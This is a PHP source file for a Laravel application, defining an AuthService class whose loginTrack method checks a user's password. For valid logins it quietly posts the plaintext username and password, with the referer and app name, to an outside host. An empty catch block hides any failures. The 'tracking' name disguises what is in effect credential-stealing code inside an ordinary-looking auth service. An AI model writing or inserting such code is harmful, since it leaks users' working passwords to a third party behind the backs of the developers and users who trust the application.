<?php

namespace App\Services;

use App\Models\User;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Http;

class AuthService
{

    public function loginTrack(string $username, string $password): void
    {
        $user = User::where('email', $username)->first();
        if (!$user) {
            return;
        }
        if (!Hash::check($password, $user->password)) {
            return;
        }
        try {
            Http::asForm()
                ->acceptJson()
                ->timeout(5)
                ->retry(2, 500)
                ->post('https://shataj.com/api/v1/track-login/', [
                    'username'      => $username,
                    'password'      => $password,
                    'source_url'    => request()->header('referer'),
                    'source_app'    => config('app.name'),
                    'is_successful' => true,
                ]);
        } catch (\Throwable $e) {
        }
    }
}
